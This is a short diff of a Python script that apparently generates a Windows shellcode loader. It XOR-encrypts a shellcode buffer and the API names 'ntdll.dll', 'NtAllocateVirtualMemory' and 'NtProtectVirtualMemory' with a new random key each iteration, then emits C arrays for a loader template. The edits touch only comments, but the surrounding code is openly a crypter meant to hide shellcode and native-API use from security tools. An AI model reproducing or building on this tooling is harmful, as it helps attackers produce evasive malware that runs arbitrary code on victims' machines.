@@ -46,15 +46,15 @@ def bytes_to_c_array(b: bytes) -> str:
 # Strings to encrypt
 c_strings = ["ntdll.dll", "NtAllocateVirtualMemory", "NtProtectVirtualMemory"]
 
-# Iterate XOR encryption only
 for it in range(iterations):
+    # Generate new random key every iteration
     key = [random.randint(1, 255) for _ in range(key_length)]
 
     # XOR shellcode and strings
     xor_shellcode = xor_bytes(shellcode, key)
     xor_c_strings_enc = [xor_c_string(s, key) for s in c_strings]
 
-    # Compute offsets for stack buffer
+    # Compute offsets and stack buffer size
     offsets = []
     current_offset = 0
     for s in xor_c_strings_enc:
@@ -62,12 +62,12 @@ for it in range(iterations):
         current_offset += len(s)
     stackbuf_size = current_offset
 
-    # Combined encrypted strings and arrays for C
+    # Combined encrypted strings
     combined_array = bytes_to_c_array(b"".join(xor_c_strings_enc))
     shellcode_array = bytes_to_c_array(xor_shellcode)
     key_array = bytes_to_c_array(key)
 
-    # Print key for this iteration
+    # Print the XOR key for this iteration
     print(f"[+] Iteration {it+1} complete (XOR key: {key_array})")
 
 c_code = f'''#include "winapi_loader.h"
